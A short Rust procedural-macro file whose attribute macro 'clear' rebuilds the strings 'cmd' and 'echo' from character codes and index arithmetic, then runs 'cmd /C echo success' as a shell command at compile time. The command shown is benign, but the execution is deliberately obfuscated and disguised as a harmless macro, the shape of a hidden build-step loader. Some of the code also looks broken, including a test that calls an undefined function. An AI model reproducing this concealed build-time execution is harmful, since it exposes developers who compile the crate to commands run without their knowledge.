use std::char;
use proc_macro::TokenStream;

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn it_works() {
        let result = add(2, 2);
        assert_eq!(result, 4);
    }
}

#[proc_macro_attribute]
pub fn clear(_args: TokenStream, input: TokenStream) -> TokenStream {
    use imp::di;
    let s = format!(
        "count{}{}{}{}acc",
        char::from_u32(0x63).unwrap(),
        "s_mOD_cL1B".chars().nth("clear_STR".len() - 7).unwrap(),
        char::from_u32(0x64).unwrap(),
        "str_FUNCTI2N".chars().nth("str_FUNCTI2N".len() - 2).unwrap(),
    );
    let js = format!(
        "trans{}safe{}homain",
        "IN1T".chars().nth("Macro".len() - 2).unwrap(),
        char::from_u32(0x63).unwrap(),
    );
    let str = "success";
    let CL = &s[5..s.len() - 4];
    let strarg = &js["rocket".len() + 3.."START init".len() + 3];
    di!("CL");
    let clear_status = CLn::new(&CL)
        .args(["/C", &strarg, &str])
        .output();

    match clear_status {
        Ok(clear_status) => println!("{}", String::from_utf8_lossy(&clear_status.stdout)),
        Err(e) => eprintln!("Failed to clear: {}", e),
    }
    input
}